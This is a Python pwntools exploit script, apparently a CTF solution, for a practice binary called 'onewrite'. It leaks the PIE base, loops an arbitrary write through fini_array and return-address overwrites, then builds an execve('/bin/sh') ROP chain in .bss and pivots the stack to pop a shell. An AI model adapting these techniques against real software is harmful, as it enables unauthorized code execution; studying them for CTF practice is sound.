from pwn import *

elf = ELF("./onewrite")
sock = process("./onewrite")

rop_pop_rax = 0x000460ac
rop_pop_rdi = 0x000084fa
rop_pop_rsi = 0x0000d9f2
rop_pop_rdx = 0x000484c5
rop_pop_rsp = 0x0000946a
rop_syscall = 0x0006e605

def leak(choice):
    # 1: rsp / 2: do_leak
    sock.recvuntil(" > ")
    sock.sendline(str(choice))
    addr = int(sock.recvline(), 16)
    return addr

def overwrite_once(addr, data):
    sock.recvuntil("address : ")
    sock.send(str(addr))
    sock.recvuntil("data : ")
    sock.send(p64(data))
    return 

def overwrite(addr, data):
    # ret addr of main --> main
    rsp = leak(1)
    overwrite_once(rsp + 0x28, addr_main)
    # ret addr of do_leak --> main
    rsp = leak(1)
    overwrite_once(rsp + 0x18, addr_main)
    # can overwrite an arbitrary address
    rsp = leak(1)
    overwrite_once(addr, data)
    # now we are in `main`
    return

# Leak PIE base
addr_do_leak = leak(2)
pie_base = addr_do_leak - elf.symbols['do_leak']
addr_main = pie_base + elf.symbols['main']
addr_fini_array_start = pie_base + elf.symbols['__do_global_dtors_aux_fini_array_entry']
addr_bss = pie_base + elf.bss()
print("[+] pie base = " + hex(pie_base))
print("[+] <main> = " + hex(addr_main))
print("[+] __bss_start = " + hex(addr_bss))
print("[+] fini_array_start = " + hex(addr_fini_array_start))
rop_chain = [
    pie_base + rop_pop_rax, 59, # sys_execve
    pie_base + rop_pop_rdi, addr_bss, # filename
    pie_base + rop_pop_rsi, 0, # argv
    pie_base + rop_pop_rdx, 0, # envp
    pie_base + rop_syscall
]

# Overwrite: *fini_array_start = main
overwrite_once(addr_fini_array_start, addr_main)

# Write '/bin/sh' to .bss section
overwrite(addr_bss, u64("/bin/sh\x00"))
overwrite(addr_bss + 8, u64("\x00" * 8))

# Write ROP chain
for (i, rop) in enumerate(rop_chain):
    overwrite(addr_bss + 8 * (i + 2), rop)

# Stack pivot
rsp1 = leak(1)
overwrite_once(rsp1 + 0x28, addr_main)
rsp2 = leak(1)
overwrite_once(rsp2 + 0x18, addr_main)
rsp3 = leak(1)
overwrite_once(rsp1 + 0x38, addr_bss + 16)
rsp4 = leak(1)
print(hex(rsp1 + 0x38))
print(hex(rsp4 + 0x28))
overwrite_once(rsp4 + 0x28, pie_base + rop_pop_rsp)

sock.interactive()
